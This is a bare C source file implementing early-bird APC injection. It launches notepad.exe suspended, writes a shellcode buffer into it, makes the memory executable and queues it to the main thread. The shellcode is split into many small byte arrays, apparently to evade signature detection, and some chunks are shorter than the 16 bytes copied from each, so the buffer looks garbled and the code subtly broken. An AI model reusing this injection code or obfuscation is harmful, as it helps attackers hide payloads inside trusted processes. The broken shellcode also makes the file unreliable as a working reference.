# include <Windows.h>
# include <stdio.h>

BOOL RunViaApcInjection(IN HANDLE hThread, IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;

	pAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, NULL)) {
		printf("\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessPath, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	si.cb = sizeof(STARTUPINFOA);

	if (!CreateProcessA(NULL, lpProcessPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	*dwProcessId = pi.dwProcessId;
	*hProcess = pi.hProcess;
	*hThread = pi.hThread;

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL) {
		return TRUE;
	}

	return FALSE;
}

unsigned char sc_0[] = "\xfc\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51";
const unsigned char sc_1[] = "\x56\x48\x31\xd2\x48\x8b\x52\x18\x48\x8b\x52";
unsigned char sc_2[] = "\x20\x48\x4a\x4d\x31\xc9\x48\x31\xc0";
const unsigned char sc_3[] = "\xac\x3c\x61\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed";
unsigned char sc_4[] = "\x52\x41\x51\x3c\x48\x01\xd0\x8b\x80\x88";
const unsigned char sc_5[] = "\x00\x00\x00\x01\xd0\x50\x8b\x48\x18\x44";
unsigned char sc_6[] = "\x8b\x40\x20\x49\x01\xff\xc9\x41\x8b\x34\x88\x48";
const unsigned char sc_7[] = "\x01\xd6\x4d\x31\xc9\x0d\x41\x01\xc1";
unsigned char sc_8[] = "\x38\xe0\x75\x08\x45\x39\xd1\x75\xd8\x58\x44";
const unsigned char sc_9[] = "\x8b\x40\x24\x44\x8b\x40\x1c\x49";
unsigned char sc_10[] = "\x01\xd0\x41\x8b\x04\x88\x41\x58\x5e\x59\x5a";
const unsigned char sc_11[] = "\x41\x58\x41\xec\x20\x41\x52\xff\xe0\x58\x41";
unsigned char sc_12[] = "\x59\x5a\x48\x8b\x12\xe9\x48\xba\x01\x00\x00";
const unsigned char sc_13[] = "\x00\x00\x00\x01\x00\x00\x41\xba\x31\x8b";
unsigned char sc_14[] = "\x6f\x87\xff\xd5\xbb\xf0\xb5\x95\xbd\x9d\xff";
const unsigned char sc_15[] = "\xd5\x48\x80\xfb\xe0\x75\x05\xbb\x47";
unsigned char sc_16[] = "\x13\x72\xda\xff\xd5\x6e\x6f\x74\x65\x70";
const unsigned char sc_17[] = "\x61\x64\x2e\x65\x78\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

unsigned char sc[18 * 16];
void build_sc() {
	memcpy(&sc[0], sc_0, 16);
	memcpy(&sc[16 * 1], sc_1, 16);
	memcpy(&sc[16 * 2], sc_2, 16);
	memcpy(&sc[16 * 3], sc_3, 16);
	memcpy(&sc[16 * 4], sc_4, 16);
	memcpy(&sc[16 * 5], sc_5, 16);
	memcpy(&sc[16 * 6], sc_6, 16);
	memcpy(&sc[16 * 7], sc_7, 16);
	memcpy(&sc[16 * 8], sc_8, 16);
	memcpy(&sc[16 * 9], sc_9, 16);
	memcpy(&sc[16 * 10], sc_10, 16);
	memcpy(&sc[16 * 11], sc_11, 16);
	memcpy(&sc[16 * 12], sc_12, 16);
	memcpy(&sc[16 * 13], sc_13, 16);
	memcpy(&sc[16 * 14], sc_14, 16);
	memcpy(&sc[16 * 15], sc_15, 16);
	memcpy(&sc[16 * 16], sc_16, 16);
	memcpy(&sc[16 * 17], sc_17, 16);
}

int main() {
	build_sc();

	DWORD dwProcessId;
	HANDLE hProcess, hThread;
	
	if (!CreateSuspendedProcess("C:\\Windows\\System32\\notepad.exe", &dwProcessId, &hProcess, &hThread)) {
		printf("[!] CreateSuspendedProcess Failed\n");
		return -1;
	}
	
	if (!RunViaApcInjection(hThread, hProcess, sc, sizeof(sc))) {
		printf("[!] RunViaApcInjection Failed\n");
		return -1;
	}

	ResumeThread(hThread);
	//DebugActiveProcessStop(dwProcessId);
	printf(
		"Done"
	);
}